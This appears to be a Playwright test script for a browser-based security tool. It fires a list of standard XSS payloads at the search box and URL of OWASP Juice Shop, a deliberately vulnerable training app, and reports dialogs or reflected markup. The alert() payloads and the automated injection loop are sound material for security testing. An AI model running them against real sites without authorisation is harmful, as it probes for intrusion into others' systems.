/**
 * Quick test script for browser-mcp against OWASP Juice Shop
 * Run with: npx tsx test-juice-shop.ts
 */

import { chromium } from 'playwright';
import { FormAnalyzer } from './src/form-analyzer.js';
import { XSSDetector } from './src/xss-detector.js';

async function testJuiceShop() {
  console.log('🚀 Starting browser test against Juice Shop...\n');

  // Launch browser (visible)
  const browser = await chromium.launch({
    headless: false,
    args: ['--disable-blink-features=AutomationControlled'],
  });

  const context = await browser.newContext({
    ignoreHTTPSErrors: true,
    viewport: { width: 1280, height: 720 },
  });

  const page = await context.newPage();
  const formAnalyzer = new FormAnalyzer();
  const xssDetector = new XSSDetector();

  try {
    // Navigate to Juice Shop
    console.log('📍 Navigating to https://juice-shop.herokuapp.com/...');
    await page.goto('https://juice-shop.herokuapp.com/', {
      waitUntil: 'networkidle',
      timeout: 30000,
    });
    console.log(`✅ Loaded: ${await page.title()}\n`);

    // Dismiss welcome banner if present
    try {
      await page.click('button:has-text("Dismiss")', { timeout: 3000 });
      console.log('ℹ️  Dismissed welcome banner');
    } catch {
      // Banner might not be present
    }

    // Close cookie consent if present
    try {
      await page.click('a:has-text("Me want it")', { timeout: 3000 });
      console.log('ℹ️  Accepted cookies\n');
    } catch {
      // Might not be present
    }

    // Find the search functionality
    console.log('🔍 Looking for search functionality...');

    // Click search icon (Juice Shop uses mat-search_icon)
    try {
      await page.click('[aria-label="Show/hide search bar"]', { timeout: 5000 });
    } catch {
      await page.click('mat-icon:has-text("search")', { timeout: 5000 });
    }
    await page.waitForTimeout(1000);

    // Find search input (Juice Shop uses mat-input in search form)
    const searchInput = await page.$('input#mat-input-0, input[id^="mat-input"], input[type="text"][class*="mat-input"]');

    if (searchInput) {
      console.log('✅ Found search input\n');

      // Set up XSS detection (dialog listener)
      let dialogDetected = false;
      let dialogMessage = '';
      page.on('dialog', async (dialog) => {
        dialogDetected = true;
        dialogMessage = dialog.message();
        console.log(`  🚨 DIALOG DETECTED: ${dialogMessage}`);
        await dialog.dismiss();
      });

      // Test XSS payloads
      const payloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '"><script>alert("XSS")</script>',
        '<svg onload=alert("XSS")>',
        "'-alert('XSS')-'",
        '<iframe src="javascript:alert(1)">',
        '<body onload=alert("XSS")>',
      ];

      console.log('🧪 Testing search input for XSS vulnerabilities...\n');

      for (const payload of payloads) {
        dialogDetected = false;
        console.log(`  Testing: ${payload.substring(0, 50)}...`);

        // Clear and fill
        await searchInput.fill('');
        await searchInput.fill(payload);
        await page.keyboard.press('Enter');
        await page.waitForTimeout(1500);

        // Check for XSS indicators
        const pageContent = await page.content();

        // Check for reflection in DOM (unencoded)
        const directReflection = pageContent.includes(payload);

        // Check for partial reflection (script tag present)
        const scriptReflection = payload.includes('<script') &&
                                 pageContent.includes('<script>alert');

        if (dialogDetected) {
          console.log(`  ⚠️  XSS CONFIRMED! Dialog triggered with: "${dialogMessage}"`);
        } else if (directReflection || scriptReflection) {
          console.log(`  ⚠️  Payload reflected in DOM (potential stored/reflected XSS)`);
        } else {
          console.log(`  ✓ Payload sanitized or not reflected`);
        }

        await page.waitForTimeout(500);
      }

      // Test DOM-based XSS via URL
      console.log('\n🧪 Testing for DOM-based XSS via URL...');
      const domXSSPayloads = [
        '#<script>alert("DOM-XSS")</script>',
        '#"><img src=x onerror=alert(1)>',
        '?q=<script>alert(1)</script>',
      ];

      for (const payload of domXSSPayloads) {
        dialogDetected = false;
        console.log(`  Testing URL: ...${payload.substring(0, 40)}`);

        try {
          await page.goto(`https://juice-shop.herokuapp.com/${payload}`, {
            waitUntil: 'domcontentloaded',
            timeout: 10000
          });
          await page.waitForTimeout(1000);

          if (dialogDetected) {
            console.log(`  ⚠️  DOM XSS CONFIRMED via URL!`);
          } else {
            console.log(`  ✓ No DOM XSS detected`);
          }
        } catch (e) {
          console.log(`  ✓ Navigation blocked or errored (safe)`);
        }
      }

    } else {
      console.log('❌ Could not find search input');

      // Take a screenshot to see what we're dealing with
      await page.screenshot({ path: './evidence/juice-shop-debug.png', fullPage: true });
      console.log('📸 Debug screenshot saved');
    }

    // Discover all forms on the page
    console.log('\n📋 Discovering forms on current page...');
    const forms = await formAnalyzer.discoverForms(page);
    console.log(`   Found ${forms.length} form(s)`);

    for (const form of forms) {
      console.log(`\n   Form: ${form.selector}`);
      console.log(`   Action: ${form.action}`);
      console.log(`   Method: ${form.method}`);
      console.log(`   Fields: ${form.fields.map(f => f.name || f.type).join(', ')}`);
    }

    // Take screenshot
    const screenshotPath = './evidence/juice-shop-test.png';
    await page.screenshot({ path: screenshotPath, fullPage: false });
    console.log(`\n📸 Screenshot saved to: ${screenshotPath}`);

    console.log('\n✅ Test complete!');

  } catch (error) {
    console.error('❌ Error:', error);
  } finally {
    console.log('\n⏳ Browser will close in 5 seconds...');
    await page.waitForTimeout(5000);
    await browser.close();
  }
}

testJuiceShop().catch(console.error);
